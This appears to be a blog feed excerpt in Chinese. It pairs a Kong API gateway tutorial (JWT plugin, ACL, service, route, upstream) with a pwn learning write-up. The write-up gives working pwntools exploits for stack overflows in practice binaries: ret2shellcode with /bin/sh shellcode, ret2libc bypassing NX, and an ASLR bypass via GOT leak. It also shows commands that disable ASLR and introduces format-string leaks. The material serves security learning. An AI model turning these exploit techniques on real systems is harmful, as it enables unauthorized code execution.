<p>请求时，我们使用生成的JWT token加入请求头Authorization中, 这边提一句，请求kong的路由需要先用JWT插件开启JWT验证，这样kong才能主动检查JWT token，JWT验证的粒度可以为全局，可以负载在route上，也可以在service上（对route service不清晰的同学可以看关于他们的解释），这里我们在请求的route ping上开启JWT验证：</p>
<figure><img src="/img/kong/4.png"
         alt="image"/>
</figure>

<figure><img src="/img/kong/3.png"
         alt="image"/>
</figure>

<p>这里保持所有为默认设置就可以了。其中迷惑性较大的是consumer 参数，参数下面的解释意思是所有匿名请求来源都会被标记为user， 该参数留白的话会将所有user标记为consumer, 也就是说请求头必须带上JWT token 否则不能被识别为consumer，请求会被kong拦截，<strong>如果填上了consumer_id，并且身份验证开启了才会奏效，说的人很懵，经过一番测试下来，发现填和不填，效果是一样的</strong>。</p>
<p>上面的consumer参数我设置成留白了，看看会发生什么：</p>
<figure><img src="/img/kong/7.png"
         alt="image"/>
</figure>

<figure><img src="/img/kong/6.png"
         alt="image"/>
</figure>

<p>未带上JWT token的请求被拦截，返回401鉴权失败，带上JWT token的请求被放行，请求到了网页</p>
<p>我们把test route上的JWT插件consumer填上一个consumer_id， 看看会发生什么：</p>
<figure><img src="/img/kong/8.png"
         alt="image"/>
</figure>

<figure><img src="/img/kong/9.png"
         alt="image"/>
</figure>

<p>第一个token是被放行的consumer的JWT token</p>
<p>第二个token是其他consumer的JWT token</p>
<p>不传token:
<figure><img src="/img/kong/10.png"
         alt="image"/>
</figure>
</p>
<p>传第一个token:</p>
<figure><img src="/img/kong/11.png"
         alt="image"/>
</figure>

<p>传第二个token:</p>
<figure><img src="/img/kong/14.png"
         alt="image"/>
</figure>

<p>可见，即使填入了consumer_id, 其他consumer照样会被放行，和留白是一样的效果，唯一区别是带上其他consumer的token的user是否会被标记为其他consumer?</p>
<p>下面继续实践：</p>
<p>开启Acl，把被放行的consumer所在组(admin)标记为allow， 其他consumer的所在组（user）标记为deny</p>
<figure><img src="/img/kong/12.png"
         alt="image"/>
</figure>

<figure><img src="/img/kong/13.png"
         alt="image"/>
</figure>

<p>这时候用第二个token继续请求，</p>
<figure><img src="/img/kong/15.png"
         alt="image"/>
</figure>

<p>发现其他consumer被拦截了，也就是说其他consumer的身份被识别出来了。这就证明即使JWT插件填上了consumer_id，该插件并不会针对这个consumer进行身份识别，其他consumer不进行身份识别，而是和留白情况下的逻辑是一样的，所以这个参数是多余的，建议KONGA删除。因为consumer_id只会在「在consumer下创建JWT验证插件时生成，用于consumer的身份验证」，在一个route的JWT插件中设置consumer_id不符合逻辑。</p>
<h2 id="service">Service</h2>
<blockquote>
<p>Service entities, as the name implies, are abstractions of each of your own upstream services. Examples of Services would be a data transformation microservice, a billing API, etc.</p>
</blockquote>
<p>Service译作服务，不同于kubernetes的service, k8s的service是一个实体服务，里面包括实体pod进行逻辑处理，而kong的服务属于逻辑上的概念，要知道，kong是个api网关，大多数情况下在进行流量转发，因此kong的service 引用的是其他实体服务访问url，这里创建一个testApi service:</p>
<figure><img src="/img/kong/14.png"
         alt="image"/>
</figure>

<p>这个service配置了访问链接的host, protocol, port, path等资源定位参数，做了个套娃，形成了自己的东西，美其名曰流量转发。当然这个是有好处的哈，不是每个实体服务都在公网上。现有一种情况：kong 和 其他实体服务位于同一内网内，路由器网关只允许公网请求访问kong, 其他实体服务访问不到，这样一来就只暴露了网关kong，保护了内部服务。针对多个同名服务，kong还能进行负载均衡，kong这个功能特别强大，之前我们说到consumer能用来对请求分门别类，kong同样可以根据consumer做负载均衡限制，例如第一版api请求标记为consumer v1, 经过route负载均衡后会访问v1 api的service, consumer v2 访问同样route会打到提供v2api服务的service，各种功能结合起来非常有意思。</p>
<h2 id="route">Route</h2>
<blockquote>
<p>The Route entities defines rules to match client requests. Each Route is associated with a Service, and a Service may have multiple Routes associated to it. Every request matching a given Route will be proxied to its associated Service.</p>
</blockquote>
<p>route顾名思义，路由，提供流量入口。kong的路由形式挺多的，有host path method可供设置：</p>
<figure><img src="/img/kong/17.png"
         alt="image"/>
</figure>

<p>他们是逻辑and的关系，只有全满足时才会访问到route，如果一个请求有多个route可以满足，kong会计算路由的优先级，优先级越高就访问哪个route，优先级的计算也比较简单，就是看请求命中route的配置的个数，个数越多，优先级越高。例如请求命中host和path的路由的优先级比只命中path的优先级高。</p>
<p>route可以提供负载均衡，就是说一个route可以对应多个service。</p>
<p>当然route的配置还有很多，供大家一一挖掘，这里不展开了。</p>
<h2 id="plugin">Plugin</h2>
<blockquote>
<p>A Plugin entity represents a plugin configuration that will be executed during the HTTP request/response workflow, and it&rsquo;s how you can add functionalities to APIs that run behind Kong, like Authentication or Rate Limiting for example.</p>
</blockquote>
<p>plugin即插件，主流使用lua开发（kong是openResty项目 nginx+lua），插件开发非常灵活，首先因为openresty提供了非常多的第三方库供使用，并且可以触及kong接收到的请求的生命周期，基于生命周期开发，可细粒度控制各个环节，几乎任何功能都能做到。</p>
<p>具体可以查看中文文档中的kong开发套件。</p>
<ul>
<li>
<ul>
<li>
<ul>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-client.md">kong.client</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-ctx.md">kong.ctx</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-ip.md">kong.ip</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-log.md">kong.log</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-node.md">kong.node</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-request.md">kong.request</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-response.md">kong.response</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-router.md">kong.router</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-service.md">kong.service</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-service-request.md">kong.service.request</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-service-response.md">kong.service.response</a></li>
<li><a href="https://github.com/qianyugang/kong-docs-cn/blob/master/GUIDES&amp;REFERENCES/PDK/kong-table.md">kong.table</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="upstream">Upstream</h2>
<blockquote>
<p>The upstream object represents a virtual hostname and can be used to loadbalance incoming requests over multiple services (targets). So for example an upstream named <code>service.v1.xyz</code> with an API object created with an <code>upstream_url=https://service.v1.xyz/some/path</code>. Requests for this API would be proxied to the targets defined within the upstream.</p>
</blockquote>
<p>很抽象的概念，其实也很好理解，类比http中的Host请求头（和route中的host一样），这个host可以理解为一个虚拟主机，Upstream中的实体和host值同名，创建Upstream，是为了控制向同名host发起的请求，或者对同名host的route做一些配置，健康检查之类的。</p>
]]></content>
		</item>
		
		<item>
			<title>pwn实践记录--rop入门</title>
			<link>https://shankisme.com/posts/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/</link>
			<pubDate>Sat, 07 Mar 2020 21:43:55 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/</guid>
			<description>前言 回过来记录入门历程主要是为了复习巩固pwn的分析思路。因为写的很详细，篇幅很长，未写完的会第二天写。全部内容包括：ret2shellcode、ret2libc(绕过NX)、ret2libc(绕过ASLR)、格式化字符串漏洞。若理解有错误，请在评论区指正。
本次回顾涉及到的elf文件以及exp都能在这里获取到。 环境准备：linux(32位程序运行环境)、IDA Pro、gdb插件、python+pwntools、不屈意志:) 知识回顾：操作系统预防二进制漏洞的保护机制、elf文件组成、栈机制、大小端。
0x00 return2shellcode 文件：level1 习惯性查看保护机制：
很好全关，接下来利用IDA Pro F5大法查看反汇编结果： 发现该二进制文件main函数入口直接调用vulnerable_function()函数，然后调用了write函数。这里提个醒，反汇编遇到write()、read()、puts()、gets()一定留个心眼，这些函数对任意变量的处理都可能造成栈溢出，不过本题输出的是字符串常量，忽略，直接查看vulnerable_function()。 看到该函数创建了个局部变量（数组指针），位置距离ebp-0x88的位置，也就是距离基指针136字节位置。read()函数读取了该函数的局部变量，上文提到read()函数不检查读取限制，并且局部变量存放在栈中，因此我们可以构造payload长度=136+4(存储ebp指针地址大小)+4(返回地址大小), 来改变函数返回地址。考虑到PIE已关，并且140字节的长度足够存储一个shellcode执行execve(&amp;quot;/bin/sh&amp;quot;)。因此我们从payload的开始位置存shellcode，剩下的用&amp;rsquo;A&amp;rsquo;补全，返回地址指向payload起始地址，也就是局部变量的起始地址。但是地址我们还不知道，因为它是在栈里面加载的。考虑到栈的动态变化，IDAPro的静态分析无法展示（它的动态分析比较麻烦），接下来用gdb配合peta插件进行动态分析： 在入口函数下断点： run/start 执行到main函数入口停下： 依次 next next 在汇编下一步执行vulnerable_function()函数的时候，step命令进入函数内部： 进入之后，我们就能看到该函数的栈情况了 接下来依次next 执行到read()函数的时候，象征性输入字符： 可以看到栈区0xffffd060地址上存放了该局部变量（上面的0xffffd060是文字常量区（常量池）范围内的地址，主要存储字符串常量），至此所有的分析工作就完成了。
接下来最最最关键的地方来了，很多初学者都会落进去的坑：其实gdb调试和实际执行程序的栈位置相比会有些偏移，为了提供buf更精确的位置，我们需要开启core dump功能来收集实际运行环境下的变量分布情况。 暂时开启core dump命令
ulimit -c unlimited 执行level1:
./level1 输入字符使栈溢出。 可以看到目录下多出来了个core文件。 接下来用gdb 配合core文件再次调试level1 然后输入 x $esp-144查看buf的位置, 这里的esp指的是实际环境下程序执行出错的时候的esp, 执行返回命令时，esp退回到main函数的栈顶，因此buf的位置 = esp指针存的位置 - payload的长度(144)。 得到buf实际地址：0xffffd0c0 接下来我们就能安心的写exp了。
from pwn import * p = process(&amp;#39;./level1&amp;#39;) ret = 0xffffd0c0 shellcode = &amp;#34;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&amp;#34; shellcode += &amp;#34;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&amp;#34; shellcode += &amp;#34;\x0b\xcd\x80&amp;#34; payload = shellcode + &amp;#39;A&amp;#39; * (140 - len(shellcode)) + p32(ret) p.</description>
			<content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>回过来记录入门历程主要是为了复习巩固pwn的分析思路。因为写的很详细，篇幅很长，未写完的会第二天写。全部内容包括：ret2shellcode、ret2libc(绕过NX)、ret2libc(绕过ASLR)、格式化字符串漏洞。若理解有错误，请在评论区指正。</p>
<p>本次回顾涉及到的elf文件以及exp都能在<a href="https://github.com/TonyShanc/new2pwn">这里</a>获取到。
环境准备：linux(32位程序运行环境)、IDA Pro、gdb插件、python+pwntools、不屈意志:)
知识回顾：<a href="https://blog.csdn.net/RChaos/article/details/104344276">操作系统预防二进制漏洞的保护机制</a>、elf文件组成、栈机制、大小端。</p>
<h2 id="0x00-return2shellcode">0x00 return2shellcode</h2>
<p>文件：level1
习惯性查看保护机制：</p>
<p>很好全关，接下来利用IDA Pro F5大法查看反汇编结果：
<img src="/img/pwn/3.jpg" alt="3.jpg">
发现该二进制文件main函数入口直接调用vulnerable_function()函数，然后调用了write函数。这里提个醒，反汇编遇到write()、read()、puts()、gets()一定留个心眼，这些函数对任意变量的处理都可能造成栈溢出，不过本题输出的是字符串常量，忽略，直接查看vulnerable_function()。
<img src="/img/pwn/4.jpg" alt="4.jpg">
看到该函数创建了个局部变量（数组指针），位置距离ebp-0x88的位置，也就是距离基指针136字节位置。read()函数读取了该函数的局部变量，上文提到read()函数不检查读取限制，并且局部变量存放在栈中，因此我们可以构造payload长度=136+4(存储ebp指针地址大小)+4(返回地址大小), 来改变函数返回地址。考虑到PIE已关，并且140字节的长度足够存储一个shellcode执行execve(&quot;/bin/sh&quot;)。因此我们从payload的开始位置存shellcode，剩下的用&rsquo;A&rsquo;补全，返回地址指向payload起始地址，也就是局部变量的起始地址。但是地址我们还不知道，因为它是在栈里面加载的。考虑到栈的动态变化，IDAPro的静态分析无法展示（它的动态分析比较麻烦），接下来用<strong>gdb配合peta插件</strong>进行动态分析：
在入口函数下断点：
<img src="/img/pwn/5.jpg" alt="5.jpg">
run/start 执行到main函数入口停下：
<img src="/img/pwn/6.jpg" alt="6.jpg">
依次
next  next
在汇编下一步执行vulnerable_function()函数的时候，step命令进入函数内部：
<img src="/img/pwn/7.jpg" alt="7.jpg">
进入之后，我们就能看到该函数的栈情况了
接下来依次next 执行到read()函数的时候，象征性输入字符：
<img src="/img/pwn/8.jpg" alt="8.jpg">
可以看到栈区0xffffd060地址上存放了该局部变量（上面的0xffffd060是文字常量区（常量池）范围内的地址，主要存储字符串常量），至此所有的分析工作就完成了。</p>
<p>接下来最最最关键的地方来了，很多初学者都会落进去的坑：其实gdb调试和实际执行程序的栈位置相比会有些偏移，为了提供buf更精确的位置，我们需要开启core dump功能来收集实际运行环境下的变量分布情况。
暂时开启core dump命令</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">ulimit</span> -c unlimited
</code></pre></div><p>执行level1:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">./level1
</code></pre></div><p>输入字符使栈溢出。
可以看到目录下多出来了个core文件。
接下来用gdb 配合core文件再次调试level1
然后输入<code> x $esp-144</code>查看buf的位置, 这里的esp指的是实际环境下程序执行出错的时候的esp, 执行返回命令时，esp退回到main函数的栈顶，因此buf的位置 = esp指针存的位置 - payload的长度(144)。
<img src="/img/pwn/10.jpg" alt="8.jpg">
得到buf实际地址：0xffffd0c0
接下来我们就能安心的写exp了。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./level1&#39;</span><span class="p">)</span>
<span class="n">ret</span> <span class="o">=</span> <span class="mh">0xffffd0c0</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73</span><span class="s2">&#34;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0</span><span class="s2">&#34;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x0b\xcd\x80</span><span class="s2">&#34;</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">140</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><p>效果如下：
<img src="/img/pwn/9.jpg" alt="8.jpg"></p>
<h2 id="0x01-ret2libc绕过nx">0x01 ret2libc(绕过NX)</h2>
<p>文件：level2
保护：NX
查看保护机制：
<img src="/img/pwn/11.jpg" alt="8.jpg">
PIE(ASLR)是系统保护，有时查看文件保护机制虽然显示enabled , 但其实是开着的，保险起见，我们可以用：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cat /proc/sys/kernel/randomize_va_space
</code></pre></div><p>或者多次ldd &lt;filename&gt;查看地址偏移情况:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ldd level2
</code></pre></div><p>修改用重定向就行了：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo -s
<span class="nb">echo</span> <span class="m">0</span> &gt; /proc/sys/kernel/randomize_va_space
</code></pre></div><p>NX开启，栈数据段没有执行权限，因此不能将shellcode存在栈上。考虑到PIE(ASLR)没开，libc动态链接库中有execve()函数，并且存在&quot;/bin/sh&quot;字符串，接下来的思路就是覆盖返回地址，执行libc中的execve()或system(), 并将指向&quot;/bin/sh&quot;的指针作为函数的参数。
用IDA Pro打开，反汇编并整理成C代码，发现代码和上一题是一样的，知识NX没开；
<img src="/img/pwn/3.jpg" alt="6.jpg">
<img src="/img/pwn/4.jpg" alt="6.jpg">
下面要做的工作是：调试level2，在libc动态链接库载入之后，找到两个系统函数和&quot;/bin/sh&quot;的地址。
在main()处设断点后，运行。
此时libc动态库已经载入了，然后用print 和 find命令分别查找函数和字符串的地址：
<img src="/img/pwn/12.jpg" alt="6.jpg">
<img src="/img/pwn/13.jpg" alt="6.jpg">
<img src="/img/pwn/14.jpg" alt="6.jpg">
下面是这道题的关键，传递的&quot;/bin/sh&quot;应该放在payload的哪个位置？
答：在返回地址的下一个高地址位。
这个问题我之前在调试信息里分析了好久，终于找到了比较合理的解释(后来才发现是我栈机制没完全看明白。。)。
我们先借助main()函数内部的write()调用过程来看看它的参数传递过程：
<img src="/img/pwn/16.jpg" alt="6.jpg">
<img src="/img/pwn/15.jpg" alt="6.jpg">
容易看出，执行call 0x8048340 &lt;write@plt&gt; (plt下一题会讲到) 后，栈中存进了该汇编指令的下一个指令的地址，也就是write()的返回地址。细看，又会发现write函数的三个参数，在调用call指令之前就已经压栈了，压栈顺序是参数从右到左的顺序。对应的汇编指令如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">0x804843b &lt;main+14&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0xd
0x8048443 &lt;main+22&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8048530
0x804844b &lt;main+30&gt;:	mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x1
</code></pre></div><p><img src="/img/pwn/17.jpg" alt="6.jpg">
因此可以这样总结：函数参数先逆序入栈，接下来才标记返回地址和执行被调用函数汇编指令。
分析完后，看看execve()和system()的传参要求：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">int execve<span class="o">(</span>const char *filename, char *const argv<span class="o">[]</span>, char *const envp<span class="o">[])</span><span class="p">;</span>
int system<span class="o">(</span>const char * string<span class="o">)</span><span class="p">;</span>
</code></pre></div><p>发现system只要求一个文件名字符串指针，本着谁参数少欺负谁的态度，盘它！
构造payload: <code>payload = 'A' *140 + sys_addr + 'A' * 4 + binsh_addr</code>
注意！这里&rsquo;A' * 4 是因为返回地址是直接到system函数内部的，没有经过call &lt;system@plt&gt;, 返回地址未压栈, 但是栈不知道，它还会认为有个返回地址，因此这里的‘A’ * 4是填补返回地址用的，如果你还想在返回时做进一步的事情，可以写个确切的地址。</p>
<p>这里说一句：这里不用像上一题产生core dump ，因为返回地址不在栈中，没有地址偏移影响。
exp如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./level2&#39;</span><span class="p">)</span>
<span class="c1">#p = remote(&#39;127.0.0.1&#39;,10002)</span>
<span class="n">sys_addr</span><span class="o">=</span><span class="mh">0xf7e138b0</span>
<span class="n">binsh_addr</span><span class="o">=</span><span class="mh">0xf7f5e42d</span>
<span class="n">payload</span> <span class="o">=</span>  <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><p>结果如下：
<img src="/img/pwn/19.jpg" alt="6.jpg"></p>
<h2 id="0x02-ret2libc绕过aslrpie">0x02 ret2libc(绕过ASLR/PIE)</h2>
<p>文件：还是level2
保护：ASLR NX
下面我们把系统ASLR/PIE防护开启：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo -s
<span class="nb">echo</span> <span class="m">2</span> &gt;  /proc/sys/kernel/randomize_va_space
</code></pre></div><p><img src="/img/pwn/20.jpg" alt="figure">
这里就不能像上题那样将返回地址覆盖成libc库函数的地址了，因为每次执行libc的地址会有一定的偏移，但我们仍然能定位到libc库函数的地址。具体怎么做呢？
level2内的vulnerable_function()内调用read函数时，执行了call &lt;read@plt&gt;指令，plt是什么呢？<a href="https://www.freebuf.com/articles/system/135685.html">这里</a>有详细的解释。文章内我只简单解释。。
我们先读取level2文件的elf结构：
<img src="/img/pwn/21.jpg" alt="figure">
发现.plt段在level2文件内，和程序段.text是分开的。
这里就不放图了，不知道为什么我step进call &lt;write@plt&gt;的时候直接跳到了write汇编程序地址，立个flag, 有空补上。
简单的说，plt是个跳转表 跳转到got表中read函数地址指针所在的区域，然后在got表内再跳转，最终才会跳转到write函数的地址。这种链接采用的是延迟绑定技术，执行第一个libc库函数时，libc才会链接到到level2，由于我们在vulnerable_function()中执行了read(),write()地址也就固定了。（整个过程我也不是很清楚，如果你想深入了解还得多看看其他资料）。</p>
<p>下面说说绕过ASLR/PIE的思路：
上文提到：调用libc库函数采用延迟绑定技术，执行第一个libc库函数时，libc才会链接到到level2，由于我们在vulnerable_function()中执行了read(),write()地址也就固定了。因此第一步是先获取到write函数真正的地址，记为write_addr。由于write()和system()在libc中的相对位置是固定的，也就是说它们之间的偏移量固定，因此我们就可以先事先获取偏移量，然后借助read函数作为跳板，就能得到system()的地址sys_addr了。同样的&quot;/bin/sh&quot;的地址也能固定，binsh_addr也出来了。
exp如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;level2&#39;</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./level2&#39;</span><span class="p">)</span>
<span class="c1">#p = remote(&#39;127.0.0.1&#39;, 10003)</span>
<span class="n">plt_write</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
<span class="nb">print</span> <span class="s1">&#39;plt_write= &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">plt_write</span><span class="p">)</span>
<span class="n">got_write</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
<span class="nb">print</span> <span class="s1">&#39;got_write= &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span>
<span class="n">vulfun_addr</span> <span class="o">=</span> <span class="mh">0x08048404</span>
<span class="nb">print</span> <span class="s1">&#39;vulfun= &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">vulfun_addr</span><span class="p">)</span>
<span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">vulfun_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x4</span><span class="p">)</span>
<span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">###sending payload1 ...###&#34;</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
<span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">###receving write() addr...###&#34;</span>
<span class="n">write_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="nb">print</span> <span class="s1">&#39;write_addr=&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
<span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">###calculating system() addr and </span><span class="se">\&#34;</span><span class="s2">/bin/sh</span><span class="se">\&#34;</span><span class="s2"> addr...###&#34;</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
<span class="nb">print</span> <span class="s1">&#39;system_addr= &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)))</span>
<span class="nb">print</span> <span class="s1">&#39;binsh_addr= &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">140</span>  <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">vulfun_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
<span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">###sending payload2 ...###&#34;</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><p>效果如下：
<img src="/img/pwn/22.jpg" alt="figure"></p>
<h2 id="0x03格式化字符串漏洞">0x03格式化字符串漏洞</h2>
<p>文件：pwne (2017湖湘杯pwn200赛题)
保护：ASLR NX
printf函数的格式化字符串常见的有 %d，%f，%c，%s（用于读取内存数据），%x（输出16进制数，前面没有0x），%p或%#x（输出16进制数，前面带有0x）；%n是一个不经常用到的格式符，它的作用是把前面已经打印的长度写入某个内存地址，用于修改内存，除了%n,还有%hn，%hhn，%lln，分别为写入目标空间4字节，2字节，1字节，8字节。</p>
<p>综上，格式化字符可以分为两类：读取数据格式符和写入数据格式符。</p>
<p>这里说一下，不是所有C编译器都支持%n, 我在windows上的codeblocks配的是C99标准的gcc编译器，执行无法靠%n写入数据，在这里我也有点迷惑，出题的人到底是用的什么编译器。。</p>
<p>既然本地不一定能做到，那就用现成的题目文件吧。</p>
<p>下面我们用这个文件看一下利用格式化字符串漏洞读取数据的方法：
<img src="/img/pwn/23.jpg" alt="figure">
我们看到，第七个%x取值是0x41414141, 也就是AAAA的ascii码，造成内存泄漏了。
解释：该文件GET YOUR NAME:后， 执行的是printf(str)。
也就是说，它把我们的输入当格式化字符串执行了。
我们%x取的其实是寄存器中的内容，寄存器里面又存什么呢？
是printf除格式化字符串外的参数，但是这里没有输入参数，也就是说，寄存器的内容其实是垃圾值。</p>
<p>那又为什么在第七个%x取值位置输出了AAAA呢？
因为调用printf后，首先再把格式化字符串压栈，再把参数地址存进寄存器和栈中，再把所有能用的寄存器压栈，最后存进了个格式化字符串指针（用来指向格式化字符串地址，检索格式符），我这个ubuntu linux内寄存器地址加空白地址一共六个四字节空间，第七个取到的就是格式化字符串中的AAAA了。
栈图(网上找的)如下：
<img src="/img/pwn/23.png" alt="figure">
墨绿是寄存器地址，蓝色是空白位或者额外的存储参数空间，绿色是格式化字符串内容，橙色是格式化字符串指针。</p>
